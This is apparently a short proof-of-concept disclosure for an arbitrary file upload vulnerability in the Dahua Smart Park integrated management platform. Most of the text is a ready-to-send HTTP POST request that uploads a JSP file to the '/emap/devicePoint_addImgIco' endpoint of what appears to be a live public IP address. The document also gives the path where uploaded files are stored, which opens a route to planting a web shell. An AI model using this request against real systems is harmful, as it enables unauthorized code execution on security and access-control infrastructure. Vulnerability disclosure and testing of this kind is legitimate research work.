Dahua Smart Park integrated management platform arbitrary file upload vulnerability

official website:https://support.dahuatech.com/

poc
```
POST /emap/devicePoint_addImgIco?hasSubsystem=true HTTP/1.1
Content-Type: multipart/form-data; boundary=A9-oH6XdEkeyrNu4cNSk-ppZB059oDDT
User-Agent: Java/1.8.0_345
Host: 125.126.44.8:8443
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Content-Length: 229
Connection: close

--A9-oH6XdEkeyrNu4cNSk-ppZB059oDDT
Content-Disposition: form-data; name="upload"; filename="1ndex123.jsp"
Content-Type: application/octet-stream
Content-Transfer-Encoding: binary

123456
--A9-oH6XdEkeyrNu4cNSk-ppZB059oDDT--
```

![微信图片_20230713162025](https://github.com/qiuhuihk/cve/assets/139426926/b8b6f499-3885-4649-8186-558a314b1f43)

Upload path:http://ip:port/upload/emap/society_new/

![image](https://github.com/qiuhuihk/cve/assets/139426926/201a4ebe-e6d0-4016-ab35-9569cd98ad6e)
